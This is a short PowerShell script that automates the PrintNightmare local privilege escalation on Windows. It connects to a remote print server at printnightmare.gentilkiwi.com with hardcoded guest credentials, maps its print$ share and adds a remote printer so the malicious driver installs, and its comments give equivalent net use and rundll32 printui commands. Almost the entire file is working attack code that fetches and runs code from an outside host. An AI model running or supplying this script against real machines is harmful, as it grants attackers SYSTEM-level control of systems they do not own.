## All respect to @gentilkiwi for his amazing work
## This script attempts to automatically connect to his LPE-as-a-service server,
## and exploit vulnerable endpoints.
## Legacy code, based on rundll32 and net use can be seen below:
## net use \\printnightmare.gentilkiwi.com\IPC$ /user:"20.188.56.147\gentilguest" password
## rundll32 printui.dll,PrintUIEntry /dd /dn /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
## rundll32 printui.dll,PrintUIEntry /in /q /n "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"

if (get-printer | Where-Object name -In ("\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64")){
	Remove-Printer -Name "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
	}
if (get-printer | Where-Object name -In ("\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x86")){
	Remove-Printer -Name "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x86"
	}
	
$password = ConvertTo-SecureString 'password' -AsPlainText -force
$cred = New-Object System.Management.Automation.PSCredential ("20.188.56.147\gentilguest", $password)
New-PSDrive -Name "gentilkiwi" -Root "\\printnightmare.gentilkiwi.com\print$" -PSProvider FileSystem -Credential $cred

if ([System.Environment]::Is64BitOperatingSystem){
	Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x64"
	}
else {
	Add-Printer -ConnectionName "\\printnightmare.gentilkiwi.com\Kiwi Legit Printer - x86"
	}

